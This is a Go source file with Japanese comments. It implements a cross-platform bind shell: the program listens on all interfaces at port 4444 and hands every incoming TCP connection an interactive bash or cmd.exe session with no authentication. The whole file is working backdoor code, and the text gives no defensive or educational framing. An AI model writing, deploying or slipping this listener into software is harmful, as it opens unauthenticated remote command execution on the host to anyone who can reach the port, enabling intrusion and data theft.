package main

import (
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
	"sync"
)

// getShellCommand は、OSに応じて適切なシェルコマンドを返します
func getShellCommand() *exec.Cmd {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		// PowerShellでPSReadlineの問題があるため、cmdを使用
		cmd = exec.Command("cmd.exe")
	default: // Unix系OS（Linux、macOS）
		cmd = exec.Command("/bin/bash", "-i")
	}
	return cmd
}

// handleConnection は、クライアント接続ごとに呼び出される関数です
func handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("接続を受け付けました: %s", conn.RemoteAddr())

	// シェルプロセスを起動
	cmd := getShellCommand()

	// シェルの標準入力を取得するためのパイプを作成
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Printf("stdin pipeの作成に失敗: %v", err)
		return
	}

	// シェルの標準出力を取得するためのパイプを作成
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("stdout pipeの作成に失敗: %v", err)
		return
	}

	// シェルの標準エラー出力を取得するためのパイプを作成
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("stderr pipeの作成に失敗: %v", err)
		return
	}

	// シェルプロセスを起動
	if err := cmd.Start(); err != nil {
		log.Printf("シェルの起動に失敗: %v", err)
		return
	}

	// シェルの出力をクライアントに送信し、クライアントの入力をシェルに送信する
	var wg sync.WaitGroup
	wg.Add(3) // 3つのゴルーチンを待つ

	// シェルの標準出力をクライアントに送信
	go func() {
		defer wg.Done()
		io.Copy(conn, stdout)
		log.Printf("標準出力の転送が終了しました: %s", conn.RemoteAddr())
	}()

	// シェルの標準エラー出力をクライアントに送信
	go func() {
		defer wg.Done()
		io.Copy(conn, stderr)
		log.Printf("標準エラー出力の転送が終了しました: %s", conn.RemoteAddr())
	}()

	// クライアントの入力をシェルの標準入力に送信
	go func() {
		defer wg.Done()
		io.Copy(stdin, conn)
		// クライアントが接続を閉じたらシェルの標準入力も閉じる
		stdin.Close()
		log.Printf("標準入力の転送が終了しました: %s", conn.RemoteAddr())
	}()

	// ゴルーチンの終了を待つ
	wg.Wait()

	// シェルプロセスの終了を待つ
	if err := cmd.Wait(); err != nil {
		log.Printf("シェルプロセスが終了しました: %v", err)
	}

	log.Printf("接続を終了しました: %s", conn.RemoteAddr())
}

func main() {
	// 接続先のアドレスとポート
	listenAddr := "0.0.0.0:4444" // 全てのインターフェースの4444ポートでリッスン

	// TCPリスナーを作成
	listener, err := net.Listen("tcp", listenAddr)
	if err != nil {
		log.Fatalf("リスナーの作成に失敗: %v", err)
	}
	defer listener.Close()

	log.Printf("サーバーが起動しました: %s", listenAddr)

	// 接続を待ち受ける
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("接続の受け付けに失敗: %v", err)
			continue
		}

		// 各接続を別々のゴルーチンで処理
		go handleConnection(conn)
	}
}
